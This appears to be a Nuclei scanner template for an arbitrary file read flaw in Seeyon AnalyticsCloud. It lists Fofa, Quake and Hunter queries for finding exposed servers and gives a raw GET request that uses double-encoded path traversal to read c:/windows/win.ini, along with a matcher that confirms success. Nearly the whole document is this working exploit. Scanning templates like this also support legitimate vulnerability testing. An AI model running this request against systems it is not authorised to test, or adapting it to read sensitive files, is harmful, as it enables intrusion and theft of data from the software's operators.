id: Seeyon_AnalyticsCloud_Fileread

info:
  name: Seeyon_AnalyticsCloud_Fileread
  author: HK
  severity: medium
  description: 致远互联AnalyticsCloud分析云存在任意文件读取漏洞
  metadata:
    max-request: 1
    Fofa-query: body= "/newportal/manifest.json"
    Quake-query: body= "/newportal/manifest.json"
    Hunter-query: body= "/newportal/manifest.json"
    verified: true

http:
- raw:
  - |+
    @timeout: 30s
    GET /a/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/c:/windows/win.ini HTTP/1.1
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cache-Control: max-age=0
    Connection: keep-alive
    Host: {{Hostname}}
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36

  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
      - extensions